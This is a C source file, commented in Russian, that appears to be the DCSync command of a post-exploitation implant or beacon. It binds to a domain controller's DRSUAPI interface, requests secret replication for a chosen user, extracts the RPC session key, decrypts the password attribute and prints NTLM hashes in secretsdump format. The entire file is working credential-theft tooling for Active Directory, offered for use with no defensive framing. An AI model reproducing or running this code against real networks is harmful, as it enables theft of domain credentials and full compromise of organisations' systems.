// cmd_dcsync.c — MS-DRSR DCSync: IDL_DRSBind + IDL_DRSGetNCChanges EXOP_REPL_SECRETS
//
// Требования к токену: DA или право DS-Replication-Get-Changes на domain NC.
// Типичный маршрут: steal_token(DA-процесс) → dcsync.
//
// KV-параметры: domain (UTF-8), user (sAMAccountName, UTF-8).
// Вывод: "user:RID:aad3b435b51404eeaad3b435b51404ee:NT_HASH:::\n" (секретсдамп-формат)
//
// MIDL_user_allocate/free и __C_specific_handler определены в cmd_ldap_relay.c.

#include "../core/beacon.h"

#ifndef _WIN64
/* DCSync использует DRSUAPI RPC — MIDL-стабы генерируются только для x64. */
void cmd_dcsync(const BeaconTask* t) {
    (void)t;
    out_write("dcsync: x64 only\n", 17);
}
#else /* _WIN64 */

#include "drsuapi.h"

#include <bcrypt.h>
#include <rpc.h>
#include <rpcdce.h>
#define SECURITY_WIN32
#include <security.h>
#include <dsgetdc.h>
#include <lmcons.h>
#include <lmapibuf.h>

// Сигнатура I_RpcBindingInqSecurityContext из rpcrt4.dll (недокументированный экспорт)
typedef RPC_STATUS (RPC_ENTRY *PFN_InqSecCtx)(RPC_BINDING_HANDLE, PVOID*);

// Попытка получить сессионный ключ через внутренний контекст RPC.
// Возвращает 1 и заполняет key[16] при успехе.
static int ds_get_session_key(RPC_BINDING_HANDLE hB, BYTE key[16]) {
    static PFN_InqSecCtx fn = NULL;
    if (!fn) {
        HMODULE h = GetModuleHandleA("rpcrt4.dll");
        if (h) fn = (PFN_InqSecCtx)GetProcAddress(h, "I_RpcBindingInqSecurityContext");
    }
    if (!fn) return 0;

    PVOID secCtx = NULL;
    if (fn(hB, &secCtx) != RPC_S_OK || !secCtx) return 0;

    SecPkgContext_SessionKey sk;
    rt_memset(&sk, 0, sizeof(sk));
    if (QueryContextAttributesW((PCtxtHandle)secCtx, SECPKG_ATTR_SESSION_KEY, &sk) != SEC_E_OK)
        return 0;
    if (!sk.SessionKey || sk.SessionKeyLength < 16) {
        FreeContextBuffer(sk.SessionKey);
        return 0;
    }
    rt_memcpy(key, sk.SessionKey, 16);
    FreeContextBuffer(sk.SessionKey);
    return 1;
}

// BCrypt MD5 одного блока данных.
static int ds_md5(const BYTE* in, DWORD inLen, BYTE out[16]) {
    BCRYPT_ALG_HANDLE  hAlg  = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    int ok = 0;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_MD5_ALGORITHM, NULL, 0)) goto done;
    if (BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0)) goto done;
    if (BCryptHashData(hHash, (PUCHAR)in, inLen, 0)) goto done;
    if (BCryptFinishHash(hHash, out, 16, 0)) goto done;
    ok = 1;
done:
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg)  BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

// RC4 stream cipher — без CRT.
static void ds_rc4(const BYTE key[16], const BYTE* in, BYTE* out, DWORD len) {
    BYTE s[256];
    DWORD i;
    DWORD j = 0;
    for (i = 0; i < 256; i++) s[i] = (BYTE)i;
    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key[i & 15]) & 255;
        BYTE t = s[i]; s[i] = s[j]; s[j] = t;
    }
    BYTE ii = 0, jj = 0;
    for (DWORD k = 0; k < len; k++) {
        ii++;
        jj = (BYTE)(jj + s[ii]);
        BYTE t = s[ii]; s[ii] = s[jj]; s[jj] = t;
        out[k] = in[k] ^ s[(BYTE)(s[ii] + s[jj])];
    }
}

// Форматирование байт в строку нижнего регистра hex.
static void bytes_to_hex(const BYTE* src, DWORD len, char* dst) {
    static const char h[] = "0123456789abcdef";
    for (DWORD i = 0; i < len; i++) {
        dst[i * 2]     = h[src[i] >> 4];
        dst[i * 2 + 1] = h[src[i] & 0xf];
    }
    dst[len * 2] = '\0';
}

// Вывод C-строки в выходной буфер задачи.
static void ds_out(const char* s) {
    out_write(s, (DWORD)rt_strlen(s));
}

// Flush без завершения задачи.
static void ds_flush(void) { out_flush_chunk(get_transport(), 0); }

// UTF-8 → WCHAR.
static int ds_utf8_to_wcs(const char* src, wchar_t* dst, int cap) {
    return MultiByteToWideChar(CP_UTF8, 0, src, -1, dst, cap);
}

// Расшифровка unicodePwd:
//   attrVal[0..15]  = Salt
//   attrVal[16..35] = EncData (16-байт NT-хеш + 4-байт контрольная сумма)
// decrypt_key = MD5(sessionKey[16] + RID_LE32[4] + Salt[16])
// plain       = RC4(decrypt_key, EncData) → первые 16 байт = NT-хеш
static int ds_decrypt_hash(const BYTE* attrVal, DWORD attrLen,
                            const BYTE sessionKey[16], DWORD rid,
                            BYTE ntHash[16])
{
    if (attrLen < 36) return 0;

    const BYTE* salt    = attrVal;
    const BYTE* encData = attrVal + 16;
    DWORD       encLen  = attrLen - 16;

    BYTE md5In[36];
    rt_memcpy(md5In,      sessionKey, 16);
    md5In[16] = (BYTE)(rid & 0xFF);
    md5In[17] = (BYTE)((rid >>  8) & 0xFF);
    md5In[18] = (BYTE)((rid >> 16) & 0xFF);
    md5In[19] = (BYTE)((rid >> 24) & 0xFF);
    rt_memcpy(md5In + 20, salt, 16);

    BYTE rc4Key[16];
    if (!ds_md5(md5In, 36, rc4Key)) return 0;

    BYTE plain[32];
    DWORD decLen = (encLen < 32) ? encLen : 32;
    ds_rc4(rc4Key, encData, plain, decLen);
    rt_memcpy(ntHash, plain, 16);
    return 1;
}

// Извлечение RID из SID внутри DSNAME (SidLen > 0).
static DWORD ds_rid_from_dsname(const DSNAME* dn) {
    if (!dn || dn->SidLen < 8) return 0;
    const BYTE* sid = (const BYTE*)dn->Sid;
    BYTE cnt = sid[1];
    if (cnt < 1 || dn->SidLen < (ULONG)(8u + cnt * 4u)) return 0;
    const BYTE* last = sid + 8 + (cnt - 1) * 4;
    return (DWORD)last[0]
         | ((DWORD)last[1] <<  8)
         | ((DWORD)last[2] << 16)
         | ((DWORD)last[3] << 24);
}

// Строит DN вида "CN=<user>,CN=Users,DC=CORP,DC=LOCAL" из domain + username.
static void ds_build_dn(const char* domain, const char* user,
                         wchar_t* out, int outCap)
{
    wchar_t wUser[256] = {0};
    ds_utf8_to_wcs(user, wUser, 256);

    wchar_t wDom[256] = {0};
    ds_utf8_to_wcs(domain, wDom, 256);

    wchar_t tmp[1024];
    int pos = 0;

    const wchar_t p1[] = L"CN=";
    for (int i = 0; p1[i]; i++) tmp[pos++] = p1[i];
    for (int i = 0; wUser[i] && pos < 1020; i++) tmp[pos++] = wUser[i];

    const wchar_t p2[] = L",CN=Users";
    for (int i = 0; p2[i]; i++) tmp[pos++] = p2[i];

    int di = 0;
    while (wDom[di] && pos < 1015) {
        const wchar_t p3[] = L",DC=";
        for (int i = 0; p3[i]; i++) tmp[pos++] = p3[i];
        while (wDom[di] && wDom[di] != L'.' && pos < 1020) tmp[pos++] = wDom[di++];
        if (wDom[di] == L'.') di++;
    }
    tmp[pos] = 0;

    int lim = outCap - 1;
    int i = 0;
    for (; i < lim && tmp[i]; i++) out[i] = tmp[i];
    out[i] = 0;
}

// Выделяет DSNAME; StringName теперь pointer-поле (требование MIDL pointer-формы).
// Строка идёт сразу после структуры в одном блоке памяти.
static DSNAME* ds_make_dsname(const wchar_t* dn) {
    USHORT nameLen = dn ? (USHORT)rt_wstrlen(dn) : 0;
    ULONG  strBytes  = (ULONG)(nameLen + 1u) * sizeof(WCHAR);
    ULONG  allocSize = (ULONG)sizeof(DSNAME) + strBytes;
    DSNAME* p = (DSNAME*)bcalloc(allocSize);
    if (!p) return NULL;
    // structLen = wire size: fixed fields (54 байта) + строка
    p->structLen  = 54u + strBytes;
    p->SidLen     = 0;
    p->NameLen    = nameLen;
    if (dn && nameLen > 0) {
        WCHAR* strBuf = (WCHAR*)((BYTE*)p + sizeof(DSNAME));
        rt_memcpy(strBuf, dn, strBytes);
        p->StringName = strBuf;
    }
    return p;
}

// DWORD → ASCII decimal в buf (возвращает длину без \0).
static int ds_fmt_u32(char* buf, DWORD v) {
    char tmp[12]; int n = 0;
    if (!v) { buf[0] = '0'; buf[1] = '\0'; return 1; }
    while (v) { tmp[n++] = (char)('0' + v % 10); v /= 10; }
    int i = 0;
    while (n) buf[i++] = tmp[--n];
    buf[i] = '\0';
    return i;
}

// Обход REPLENTINFLIST, расшифровка и вывод хешей.
static void ds_process_objects(REPLENTINFLIST* list,
                                const BYTE sessionKey[16],
                                const char* reqUser,
                                int hasKey)
{
    static const DWORD ATTR_UNICODE_PWD = 0x00020019u;

    for (REPLENTINFLIST* cur = list; cur; cur = cur->pNextEntInf) {
        ENTINF*    ei   = &cur->Entinf;
        ATTRBLOCK* ab   = &ei->AttrBlock;
        DSNAME*    name = ei->pName;

        // Имя из первого RDN (CN=<name>,...) или fallback на аргумент запроса
        char objName[256];
        rt_memset(objName, 0, sizeof(objName));
        if (name && name->NameLen > 0) {
            const wchar_t* sn = name->StringName;
            int sni = 0;
            if (sn[0]==L'C' && sn[1]==L'N' && sn[2]==L'=') sni = 3;
            int oni = 0;
            while (sn[sni] && sn[sni] != L',' && oni < 254) {
                objName[oni++] = (char)(sn[sni] < 128 ? sn[sni] : '?');
                sni++;
            }
        }
        if (!objName[0]) {
            size_t ul = rt_strlen(reqUser);
            if (ul >= sizeof(objName)) ul = sizeof(objName) - 1;
            rt_memcpy(objName, reqUser, ul);
            objName[ul] = '\0';
        }

        DWORD rid = ds_rid_from_dsname(name);

        // Ищем unicodePwd
        ATTRVAL* hashVal = NULL;
        for (DWORD ai = 0; ai < ab->attrCount && ab->pAttr; ai++) {
            ATTR* a = &ab->pAttr[ai];
            if (a->attrTyp == ATTR_UNICODE_PWD
                && a->AttrVal.valCount > 0
                && a->AttrVal.pAVal
                && a->AttrVal.pAVal[0].pVal
                && a->AttrVal.pAVal[0].valLen >= 36) {
                hashVal = &a->AttrVal.pAVal[0];
                break;
            }
        }

        if (!hashVal) {
            ds_out(objName);
            ds_out(": unicodePwd not in response (no replication right?)\n");
            ds_flush();
            continue;
        }

        char ridStr[16];
        ds_fmt_u32(ridStr, rid);

        if (!hasKey) {
            // Нет сессионного ключа — выводим RAW hex
            char raw[133] = {0};
            DWORD dumpLen = hashVal->valLen < 64 ? hashVal->valLen : 64;
            bytes_to_hex(hashVal->pVal, dumpLen, raw);
            ds_out(objName); ds_out(":"); ds_out(ridStr);
            ds_out(":no_session_key:raw="); ds_out(raw); ds_out("\n");
            ds_flush();
            continue;
        }

        BYTE ntHash[16];
        if (!ds_decrypt_hash(hashVal->pVal, hashVal->valLen,
                             sessionKey, rid, ntHash)) {
            ds_out(objName); ds_out(":"); ds_out(ridStr);
            ds_out(":decrypt_failed\n");
            ds_flush();
            continue;
        }

        char hexHash[33];
        bytes_to_hex(ntHash, 16, hexHash);

        ds_out(objName); ds_out(":");
        ds_out(ridStr);  ds_out(":");
        ds_out("aad3b435b51404eeaad3b435b51404ee:");
        ds_out(hexHash); ds_out(":::\n");
        ds_flush();
    }
}

// ============================================================
// Точка входа команды
// ============================================================
void cmd_dcsync(const BeaconTask* t)
{
    char domain[256] = {0};
    char user[256]   = {0};

    if (!kv_get_str(t->pay, t->pay_len, "domain", domain, sizeof(domain))
        || !kv_get_str(t->pay, t->pay_len, "user",   user,   sizeof(user))) {
        out_write("dcsync: missing domain or user\n", 30);
        return;
    }

    // Найти DC через NetLogon
    PDOMAIN_CONTROLLER_INFOW dcInfo = NULL;
    wchar_t wDomain[256] = {0};
    ds_utf8_to_wcs(domain, wDomain, 256);

    DWORD dsErr = DsGetDcNameW(NULL, wDomain, NULL, NULL,
                                DS_DIRECTORY_SERVICE_REQUIRED | DS_RETURN_DNS_NAME,
                                &dcInfo);
    if (dsErr != ERROR_SUCCESS || !dcInfo) {
        char msg[80];
        const char pfx[] = "dcsync: DsGetDcNameW failed: ";
        rt_memcpy(msg, pfx, sizeof(pfx) - 1);
        int ml = sizeof(pfx) - 1;
        ml += ds_fmt_u32(msg + ml, dsErr ? dsErr : GetLastError());
        msg[ml++] = '\n'; msg[ml] = '\0';
        out_write(msg, (DWORD)ml);
        return;
    }

    // Пропускаем ведущие "\\" в имени DC
    const wchar_t* dcName = dcInfo->DomainControllerName;
    while (*dcName == L'\\') dcName++;

    // RPC binding: ncacn_ip_tcp; endpoint mapper разрешит порт DRSUAPI
    RPC_WSTR bstr = NULL;
    RPC_BINDING_HANDLE hBinding = NULL;
    RpcStringBindingComposeW(NULL, (RPC_WSTR)L"ncacn_ip_tcp",
                              (RPC_WSTR)dcName, NULL, NULL, &bstr);
    RPC_STATUS rpcSt = RpcBindingFromStringBindingW(bstr, &hBinding);
    RpcStringFreeW(&bstr);
    if (rpcSt != RPC_S_OK) {
        out_write("dcsync: RpcBindingFromStringBinding failed\n", 42);
        NetApiBufferFree(dcInfo);
        return;
    }

    // Разрешить endpoint у EPM для DRSUAPI v4
    rpcSt = RpcEpResolveBinding(hBinding, drsuapi_v4_0_c_ifspec);
    if (rpcSt != RPC_S_OK) {
        out_write("dcsync: RpcEpResolveBinding failed\n", 34);
        RpcBindingFree(&hBinding);
        NetApiBufferFree(dcInfo);
        return;
    }

    // SPN: "ldap/<dc_fqdn>" для Kerberos mutual auth
    wchar_t spn[512];
    const wchar_t spnPfx[] = L"ldap/";
    int si = 0;
    for (; spnPfx[si]; si++) spn[si] = spnPfx[si];
    for (int i = 0; dcName[i] && si < 510; i++, si++) spn[si] = dcName[i];
    spn[si] = 0;

    rpcSt = RpcBindingSetAuthInfoW(hBinding, (RPC_WSTR)spn,
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_AUTHZ_NONE);
    if (rpcSt != RPC_S_OK) {
        // Откат на чистый NTLM
        RpcBindingSetAuthInfoW(hBinding, NULL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_AUTHN_WINNT, NULL, RPC_C_AUTHZ_NONE);
    }

    // ----------------------------------------------------------------
    // IDL_DRSBind (opnum 0)
    // ----------------------------------------------------------------
    GUID clientGuid;
    UuidCreate(&clientGuid);

    // DRS_EXTENSIONS_INT (минимальные флаги)
    #pragma pack(push, 1)
    struct DrsExtInt {
        DWORD dwFlags;
        GUID  SiteObjGuid;
        DWORD Pid;
        DWORD dwReplEpoch;
        DWORD dwFlagsExt;
        GUID  ConfigObjGUID;
        DWORD dwExtCaps;
    } extInt;
    #pragma pack(pop)
    rt_memset(&extInt, 0, sizeof(extInt));
    extInt.dwFlags   = 0x001FFFFF;
    extInt.dwExtCaps = 0x7FFFFFFF;

    // DRS_EXTENSIONS: cb + pointer rgb (MIDL pointer-форма).
    DRS_EXTENSIONS extBlob;
    extBlob.cb  = sizeof(extInt);
    extBlob.rgb = (byte*)&extInt;

    DRS_EXTENSIONS* pextServer = NULL;
    DRS_HANDLE hDrs = NULL;
    ULONG drsRet = (ULONG)-1;

    RpcTryExcept {
        drsRet = IDL_DRSBind(hBinding, &clientGuid,
                              &extBlob,
                              &pextServer, &hDrs);
    }
    RpcExcept(1) {
        drsRet = RpcExceptionCode();
        hDrs = NULL;
    }
    RpcEndExcept

    if (drsRet != 0 || !hDrs) {
        char msg[64];
        const char pfx[] = "dcsync: DRSBind failed: ";
        rt_memcpy(msg, pfx, sizeof(pfx) - 1);
        int ml = sizeof(pfx) - 1;
        ml += ds_fmt_u32(msg + ml, drsRet);
        msg[ml++] = '\n'; msg[ml] = '\0';
        out_write(msg, (DWORD)ml);
        RpcBindingFree(&hBinding);
        NetApiBufferFree(dcInfo);
        return;
    }

    // Сессионный ключ (нужен после первого успешного RPC-вызова)
    BYTE sessionKey[16] = {0};
    int hasKey = ds_get_session_key(hBinding, sessionKey);
    if (!hasKey) {
        out_write("dcsync: warn: could not get session key, hash decrypt may fail\n", 62);
        ds_flush();
    }

    // ----------------------------------------------------------------
    // Построить DSNAME для целевого пользователя
    // ----------------------------------------------------------------
    wchar_t dn[1024] = {0};
    ds_build_dn(domain, user, dn, 1024);

    DSNAME* pNC = ds_make_dsname(dn);
    if (!pNC) {
        out_write("dcsync: out of memory\n", 21);
        goto cleanup_drs;
    }

    // ----------------------------------------------------------------
    // IDL_DRSGetNCChanges (opnum 3) — EXOP_REPL_SECRETS
    // ----------------------------------------------------------------
    {
        DRS_MSG_GETCHGREQ_V8 reqV8;
        rt_memset(&reqV8, 0, sizeof(reqV8));
        UuidCreate(&reqV8.uuidDsaObjDest);
        reqV8.pNC          = pNC;
        // DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_GET_ANC | DRS_GET_NC_SIZE
        reqV8.ulFlags      = 0x00000A14u;
        reqV8.cMaxObjects  = 0;
        reqV8.cMaxBytes    = 0x00A00000u;
        reqV8.ulExtendedOp = 6u; // EXOP_REPL_SECRETS
        // Пустые таблицы
        reqV8.PrefixTableDest.PrefixCount = 0;
        reqV8.PrefixTableDest.pSchema     = NULL;

        DRS_MSG_GETCHGREQ msgIn;
        msgIn.V8 = reqV8;

        DWORD outVer = 0;
        DRS_MSG_GETCHGREPLY msgOut;
        rt_memset(&msgOut, 0, sizeof(msgOut));

        ULONG ncRet = (ULONG)-1;
        RpcTryExcept {
            ncRet = IDL_DRSGetNCChanges(&hDrs, 8, &msgIn, &outVer, &msgOut);
        }
        RpcExcept(1) {
            ncRet = RpcExceptionCode();
        }
        RpcEndExcept

        if (ncRet == 0 && outVer == 6) {
            if (msgOut.V6.cNumObjects > 0 && msgOut.V6.pObjects) {
                ds_process_objects(msgOut.V6.pObjects, sessionKey, user, hasKey);
            } else {
                out_write("dcsync: object not found or no secret attrs returned\n", 52);
            }
        } else {
            char msg[64];
            const char pfx[] = "dcsync: GetNCChanges failed: ";
            rt_memcpy(msg, pfx, sizeof(pfx) - 1);
            int ml = sizeof(pfx) - 1;
            ml += ds_fmt_u32(msg + ml, ncRet);
            msg[ml++] = '\n'; msg[ml] = '\0';
            out_write(msg, (DWORD)ml);
        }
    }

    bfree(pNC);

cleanup_drs:
    if (pextServer) MIDL_user_free(pextServer);
    RpcTryExcept { IDL_DRSUnbind(&hDrs); } RpcExcept(1){} RpcEndExcept

    RpcBindingFree(&hBinding);
    NetApiBufferFree(dcInfo);
}

#endif /* _WIN64 */
